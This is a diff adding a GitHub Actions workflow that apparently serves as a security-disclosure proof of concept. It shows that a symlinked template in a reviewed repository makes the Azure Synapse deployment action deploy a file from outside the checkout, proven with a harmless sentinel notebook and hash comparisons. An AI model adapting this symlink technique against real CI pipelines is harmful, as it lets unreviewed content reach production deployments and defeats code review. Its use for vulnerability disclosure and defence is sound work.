@@ -1,0 +1,195 @@
+name: Reviewed content mismatch local proof
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    environment: production
+
+    steps:
+      - name: Generate trusted deployment artifact outside checkout
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          mkdir -p "$RUNNER_TEMP/trusted"
+
+          cat > "$RUNNER_TEMP/trusted/TemplateForWorkspace.json" <<'JSON'
+          {
+            "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+            "contentVersion": "1.0.0.0",
+            "parameters": {
+              "workspaceName": {
+                "type": "string"
+              }
+            },
+            "variables": {},
+            "resources": [
+              {
+                "name": "[concat(parameters('workspaceName'), '/review_bypass_external_payload')]",
+                "type": "Microsoft.Synapse/workspaces/notebooks",
+                "apiVersion": "2021-06-01",
+                "dependsOn": [],
+                "properties": {
+                  "folder": {
+                    "name": "msrc-reviewed-content-mismatch"
+                  },
+                  "nbformat": 4,
+                  "nbformat_minor": 2,
+                  "bigDataPool": null,
+                  "sessionProperties": {},
+                  "metadata": {
+                    "description": "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL"
+                  },
+                  "cells": []
+                }
+              }
+            ]
+          }
+          JSON
+
+          cat > "$RUNNER_TEMP/trusted/TemplateParametersForWorkspace.json" <<'JSON'
+          {
+            "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentParameters.json#",
+            "contentVersion": "1.0.0.0",
+            "parameters": {
+              "workspaceName": {
+                "value": "msrc-symlink-poc-workspace"
+              }
+            }
+          }
+          JSON
+
+          echo "[TRUSTED_GENERATED_TARGET]"
+          echo "trusted_template_path=$RUNNER_TEMP/trusted/TemplateForWorkspace.json"
+          echo "trusted_template_sha256=$(sha256sum "$RUNNER_TEMP/trusted/TemplateForWorkspace.json" | awk '{print $1}')"
+          grep -n "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL" "$RUNNER_TEMP/trusted/TemplateForWorkspace.json"
+
+      - name: Checkout reviewed repository
+        uses: actions/checkout@v4
+
+      - name: Prove reviewed object differs from consumed realpath bytes
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          echo "[PATHS]"
+          echo "GITHUB_WORKSPACE=$GITHUB_WORKSPACE"
+          echo "RUNNER_TEMP=$RUNNER_TEMP"
+
+          echo "[REVIEWED_REPO_OBJECT]"
+          git ls-files -s synapse/TemplateForWorkspace.json
+          echo "git_symlink_target=$(git cat-file -p :synapse/TemplateForWorkspace.json)"
+          echo "git_symlink_blob_sha=$(git ls-files -s synapse/TemplateForWorkspace.json | awk '{print $2}')"
+
+          REQUESTED="$GITHUB_WORKSPACE/synapse/TemplateForWorkspace.json"
+          REAL="$(realpath "$REQUESTED")"
+
+          echo "[REALPATH]"
+          echo "requestedPath=$REQUESTED"
+          echo "realpath=$REAL"
+
+          case "$REAL" in
+            "$GITHUB_WORKSPACE"/*)
+              echo "realpathWithinWorkspace=true"
+              ;;
+            *)
+              echo "realpathWithinWorkspace=false"
+              ;;
+          esac
+
+          echo "[HASHES]"
+          echo "realpath_target_sha256=$(sha256sum "$REAL" | awk '{print $1}')"
+          grep -n "MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL" "$REAL"
+
+      - name: Clone Synapse action source and build
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone https://github.com/Azure/Synapse-workspace-deployment.git /tmp/Synapse-workspace-deployment
+          cd /tmp/Synapse-workspace-deployment/build_and_deploy
+          npm install
+          npm run build
+
+      - name: Prove consumed payload reaches deploy sink
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          cd /tmp/Synapse-workspace-deployment/build_and_deploy
+
+          node - <<'NODE'
+          const fs = require('fs');
+          const path = require('path');
+          const crypto = require('crypto');
+          const { PackageFile } = require('./package_file');
+          const armUtils = require('./utils/arm_template_utils');
+
+          function sha256(s) {
+            return crypto.createHash('sha256').update(s).digest('hex');
+          }
+
+          async function main() {
+            const workspace = process.env.GITHUB_WORKSPACE;
+            const templatePath = path.join(workspace, 'synapse/TemplateForWorkspace.json');
+            const parametersPath = path.join(workspace, 'synapse/TemplateParametersForWorkspace.json');
+            const realTarget = fs.realpathSync(templatePath);
+            const realTargetBytes = fs.readFileSync(realTarget, 'utf8');
+
+            const pkg = new PackageFile(templatePath, parametersPath, "");
+            const files = pkg.getPackageFiles();
+
+            const artifacts = await armUtils.getArtifacts(
+              files.parametersFileContent,
+              files.templateFileContent,
+              files.armOverridesContent,
+              "msrc-symlink-poc-workspace",
+              "eastus"
+            );
+
+            const serializedArtifacts = JSON.stringify(artifacts, null, 2);
+
+            console.log("[REVIEWED_CONTENT_MISMATCH]");
+            console.log("requestedPath=" + templatePath);
+            console.log("realpathTarget=" + realTarget);
+            console.log("realpathWithinWorkspace=" + realTarget.startsWith(workspace + path.sep));
+            console.log("realTargetSha256=" + sha256(realTargetBytes));
+            console.log("packageFileContentSha256=" + sha256(files.templateFileContent));
+            console.log("packageFileContentMatchesRealTarget=" + (sha256(files.templateFileContent) === sha256(realTargetBytes)));
+            console.log("packageFileContentContainsExternalSentinel=" + files.templateFileContent.includes("MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL"));
+            console.log("deployableArtifactsSha256=" + sha256(serializedArtifacts));
+            console.log("deployableArtifactsContainExternalSentinel=" + serializedArtifacts.includes("MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL"));
+
+            let deployCalls = 0;
+            let deployPayloadContainsExternalSentinel = false;
+
+            for (const batch of artifacts) {
+              for (const resource of batch) {
+                deployCalls++;
+                const payload = JSON.stringify(resource, null, 2);
+                deployPayloadContainsExternalSentinel = payload.includes("MSRC_REVIEWED_CONTENT_MISMATCH_EXTERNAL_SENTINEL");
+
+                console.log("[SINK]");
+                console.log("deployArtifactCalled=true");
+                console.log("resourceType=" + resource.type);
+                console.log("payloadSha256=" + sha256(payload));
+                console.log("payloadContainsExternalSentinel=" + deployPayloadContainsExternalSentinel);
+                console.log("payloadPreview=" + payload.slice(0, 900));
+              }
+            }
+
+            console.log("[FINAL]");
+            console.log("deployCalls=" + deployCalls);
+            console.log("finalDeployPayloadContainsExternalSentinel=" + deployPayloadContainsExternalSentinel);
+          }
+
+          main().catch(err => {
+            console.error(err && err.stack || err);
+            process.exit(1);
+          });
+          NODE
